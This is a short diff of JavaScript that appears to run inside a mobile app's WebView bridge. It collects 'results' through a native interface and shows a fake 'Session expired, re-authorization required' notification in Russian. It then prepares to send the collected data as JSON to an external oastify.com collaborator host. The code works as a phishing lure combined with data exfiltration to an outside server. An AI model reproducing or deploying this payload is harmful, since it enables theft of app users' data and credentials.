@@ -29,7 +29,7 @@ if (window.Gate) {
 
 output.innerHTML = '<pre>' + JSON.stringify(results, null, 2) + '</pre>';
 
-window.WebViewInterface.showNotification("Сессия истекла", "Требуется повторная авторизация", "error");
+WebViewInterface.showNotification("Сессия истекла", "Требуется повторная авторизация", "error");
 
 const url = 'https://8jsfvy44qbgemit855hygopndej57wzko.oastify.com';
 const data = JSON.stringify(results);
